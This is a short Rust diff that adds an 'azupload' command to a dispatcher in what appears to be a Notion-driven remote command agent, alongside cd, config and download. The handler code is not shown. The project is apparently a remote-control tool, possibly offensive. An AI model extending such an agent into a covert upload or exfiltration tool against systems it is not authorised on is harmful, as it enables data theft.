@@ -8,6 +8,7 @@ use std::fmt;
 use crate::config::{ConfigOptions, ConfigOption};
 use crate::logger::Logger;
 // Command modules
+mod azupload;
 mod cd;
 mod config;
 mod download;
@@ -51,6 +52,7 @@ pub(crate) use notion_out;
 
 /// All the possible command types. Some have command strings, and some don't.
 pub enum CommandType {
+    AzUpload,
     Cd,
     Config,
     Download,
@@ -177,6 +179,7 @@ impl NotionCommand {
             let command_args  = CommandArgs::from_split(command_words);
 
             let command_type: CommandType = match t {
+                "azupload"     => CommandType::AzUpload,
                 "cd"           => CommandType::Cd,
                 "config"       => CommandType::Config,
                 "download"     => CommandType::Download,
@@ -209,6 +212,7 @@ impl NotionCommand {
     /// Executes the appropriate function for the `command_type`. 
     pub async fn handle(&mut self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
         match &self.command_type {
+            CommandType::AzUpload     => azupload::handle(&mut self.args, logger).await,
             CommandType::Cd           => cd::handle(&mut self.args),
             CommandType::Config       => config::handle(&mut self.args, config_options, logger).await,
             CommandType::Download     => download::handle( &mut self.args, logger).await,
